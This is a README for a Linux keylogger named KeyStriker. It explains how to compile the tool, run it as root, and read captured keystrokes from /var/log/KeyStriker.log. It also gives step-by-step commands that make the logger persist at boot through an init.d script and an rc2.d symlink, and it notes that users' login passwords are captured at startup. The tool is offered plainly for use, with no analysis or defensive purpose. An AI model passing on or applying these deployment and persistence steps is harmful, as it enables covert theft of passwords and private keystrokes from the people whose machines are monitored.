# Keyloger-KeyStriker
A linux keyloger with the possibility to launch it at startup.

Compile the source with code blocks IDE, codeblocks must be in root -> sudo codeblocks in a terminal; or from src folder and linux command line : gcc main.c keylogger.c utils.c -o KeyStriker

Then for launch the keyloger use the command : sudo ./KeyStriker

The log keys are in /var/log/KeyStriker.log

For see at any time if the keyloger is running use the command : ps -aux | grep KeyStriker, if you see a line like this :

root 6727 0.0 0.0 4380 76 ? Ss 03:26 0:00 ./KeyStriker

The keylogger is running.

For stop the keyloger use the command : sudo killall KeyStriker or click F12 for go out properly of the program.

For laucnh the programm at startup follow this steps :

- copy the KeyStriker binarie in /usr/bin/ and /usr/sbin/ with the command :  sudo cp KeyStriker /usr/bin/ && sudo cp KeyStriker /usr/sbin/

- copy the script called daemon_launcher.sh in /etc/init.d/ with the following command : sudo cp daemon_launcher.sh /etc/init.d

- make a symbolic link with this command :  sudo ln -s /etc/init.d/daemon_launcher.sh /etc/rc2.d/S88daemon_launcher.sh

- in script folder launch the script called startup.sh

You 're done, reboot the machine and you will see in /var/log/KeyStriker.log your user password you entered for open the linux session wish mean the daemon was running at startup.Then the keylopgger run in background and keep logging all key striked.

For stop the program at startup follow this only step :

- run the script in script folder called delete_startup.sh with the command :  sudo ./delete_startup.sh

You 're done.

Thanks.
